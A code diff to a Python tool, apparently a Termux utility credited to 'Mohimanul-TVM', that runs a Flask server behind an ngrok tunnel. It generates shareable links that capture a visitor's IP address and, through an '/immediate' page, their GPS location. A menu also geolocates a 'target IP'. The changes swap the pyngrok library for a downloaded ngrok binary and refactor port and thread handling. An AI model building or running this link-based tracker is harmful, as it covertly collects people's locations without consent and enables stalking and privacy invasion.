@@ -1,47 +1,14 @@
-import os
-import sys
-import subprocess
-import time
-import threading
-import datetime
-
-def install_package(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-
-def check_and_install_packages():
-    try:
-        import flask
-        import requests
-        import pyngrok
-    except ImportError as e:
-        pkg = str(e).split("'")[1]
-        print(f"[!] Missing package '{pkg}', installing...")
-        install_package(pkg)
-        print("[✓] Package installed, restarting script...")
-        os.execv(sys.executable, [sys.executable] + sys.argv)
-
-def check_and_install_binary(binary_name):
-    from shutil import which
-    if which(binary_name) is None:
-        print(f"[!] '{binary_name}' not found, attempting to install...")
-        if binary_name == "wget":
-            subprocess.run(["pkg", "install", "-y", "wget"], check=True)
-        elif binary_name == "unzip":
-            subprocess.run(["pkg", "install", "-y", "unzip"], check=True)
-        else:
-            print(f"[✗] Please install '{binary_name}' manually.")
-            sys.exit(1)
-        print(f"[✓] '{binary_name}' installed.")
-
-check_and_install_packages()
-check_and_install_binary("wget")
-check_and_install_binary("unzip")
-
-from flask import Flask, request, render_template_string
 import requests
-from pyngrok import ngrok, conf
+import datetime
+import os
+import time
+import subprocess
+import socket
+from flask import Flask, request, render_template_string
+from threading import Thread
 
 app = Flask(__name__)
+PORT = None
 
 HTML_BASIC = """
 <!doctype html>
@@ -83,9 +50,9 @@ HTML_IMMEDIATE = """
 
 def banner():
     print("\033[92m" + """
-╔════════════════════════════════════════════════╗
-║              Made by Mohimanul-TVM             ║
-╚════════════════════════════════════════════════╝
+╔════════════════════════════════════════════╗
+║     Made by Mohimanul-TVM (Free Version)  ║
+╚════════════════════════════════════════════╝
 """ + "\033[0m")
 
 def get_location(ip):
@@ -104,10 +71,9 @@ def get_location(ip):
                 "Map": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}",
                 "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             }
-        else:
-            return {"IP": ip, "Error": "Failed to get location data"}
     except Exception as e:
         return {"IP": ip, "Error": str(e)}
+    return {"IP": ip, "Error": "Unknown error"}
 
 @app.route('/')
 def index():
@@ -150,20 +116,40 @@ def submit_location():
 def immediate():
     return render_template_string(HTML_IMMEDIATE)
 
-def run_flask():
-    try:
-        app.run(host="0.0.0.0", port=5000)
-    except Exception as e:
-        print(f"[✗] Flask error: {e}")
+def find_free_port():
+    with socket.socket() as s:
+        s.bind(('', 0))
+        return s.getsockname()[1]
 
-def start_ngrok_tunnel():
+def download_ngrok():
+    if not os.path.isfile("ngrok"):
+        print("\033[93m[•] Downloading ngrok...\033[0m")
+        os.system("pkg install -y wget unzip")
+        os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
+        os.system("unzip ngrok.zip && rm ngrok.zip && chmod +x ngrok")
+
+def start_ngrok():
+    global PORT
+    PORT = find_free_port()
+    download_ngrok()
+    token = input("Enter your Ngrok Authtoken (required once): ").strip()
+    os.system(f"./ngrok authtoken {token}")
+    cmd = ["./ngrok", "http", str(PORT)]
+    print("\033[93m[•] Starting Ngrok tunnel...\033[0m")
+    ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(5)
     try:
-        tunnel = ngrok.connect(5000, "http")
-        print(f"\033[92m[✓] Ngrok tunnel started: {tunnel.public_url}\033[0m")
-        return tunnel
+        tunnels = requests.get("http://127.0.0.1:4040/api/tunnels").json()
+        public_url = tunnels['tunnels'][0]['public_url']
+        print(f"\033[92m[✓] Ngrok public URL: {public_url}\033[0m")
+        return ngrok_process, public_url
     except Exception as e:
-        print(f"[✗] Failed to start ngrok tunnel: {e}")
-        sys.exit(1)
+        print(f"\033[91m[✗] Failed to get ngrok URL: {e}\033[0m")
+        ngrok_process.terminate()
+        return None, None
+
+def run_flask():
+    app.run(host="0.0.0.0", port=PORT)
 
 def ip_lookup():
     ip = input("Enter target IP address: ").strip()
@@ -173,36 +159,35 @@ def ip_lookup():
         print(f"{k}: {v}")
     print("\033[96m----------------\033[0m")
 
-def generate_basic_link():
-    tunnel = start_ngrok_tunnel()
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
+def generate_link():
+    ngrok_process, url = start_ngrok()
+    if not url:
+        return
+    flask_thread = Thread(target=run_flask)
     flask_thread.start()
-    print("\033[93m[•] Flask app running on http://0.0.0.0:5000/\033[0m")
-    print(f"\033[93m[•] Share this link to capture visitor IP: {tunnel.public_url}\033[0m")
+    print(f"\033[93m[•] Share this link: {url}/\033[0m")
     try:
         while flask_thread.is_alive():
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\nExiting and terminating ngrok...")
-        ngrok.disconnect(tunnel.public_url)
-        ngrok.kill()
+        print("\nTerminating...")
+        ngrok_process.terminate()
+        flask_thread.join()
 
-def generate_immediate_link():
-    token = input("Enter your Ngrok Authtoken: ").strip()
-    conf.get_default().auth_token = token
-    tunnel = start_ngrok_tunnel()
-    full_url = tunnel.public_url + "/immediate"
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
+def immediate_ip_gps_option():
+    ngrok_process, url = start_ngrok()
+    if not url:
+        return
+    flask_thread = Thread(target=run_flask)
     flask_thread.start()
-    print(f"\033[93m[•] Flask app running on http://0.0.0.0:5000/\033[0m")
-    print(f"\033[92m[✓] Share this link to capture IP immediately + GPS: {full_url}\033[0m")
+    print(f"\033[93m[•] Share this link: {url}/immediate\033[0m")
     try:
         while flask_thread.is_alive():
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\nExiting and terminating ngrok...")
-        ngrok.disconnect(tunnel.public_url)
-        ngrok.kill()
+        print("\nTerminating...")
+        ngrok_process.terminate()
+        flask_thread.join()
 
 def menu():
     banner()
@@ -215,9 +200,9 @@ def menu():
         if choice == '1':
             ip_lookup()
         elif choice == '2':
-            generate_basic_link()
+            generate_link()
         elif choice == '3':
-            generate_immediate_link()
+            immediate_ip_gps_option()
         elif choice == '0':
             print("Exiting...")
             break
@@ -228,5 +213,4 @@ if __name__ == '__main__':
     try:
         menu()
     except Exception as e:
-        print(f"[✗] Unexpected error: {e}")
-        sys.exit(1)
+        print(f"\033[91m[✗] Error: {e}\033[0m")
